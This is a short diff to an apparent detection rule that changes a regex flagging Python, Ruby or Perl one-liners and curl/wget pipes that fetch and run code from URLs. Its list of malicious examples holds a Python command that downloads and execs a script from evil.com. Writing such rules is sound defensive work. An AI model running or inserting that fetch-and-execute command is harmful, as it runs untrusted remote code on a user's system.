@@ -5,7 +5,7 @@ description: >
   High legitimate usage in development environments requires context to distinguish malicious use.
 
 pattern: |
-  (?i)(python|ruby|perl).*(urllib|requests|eval|exec|net::http|lwp).*https?://|(curl|wget).*https?://.*\|.*(python|ruby|perl)
+  (?i)((python|ruby|perl).*(urllib|requests|eval|exec|net::http|lwp).*https?://|(curl|wget).*https?://.*\|.*(python|ruby|perl))
 
 malicious:
   - 'python -c "import urllib; exec(urllib.urlopen(''http://evil.com/p.py'').read())"'
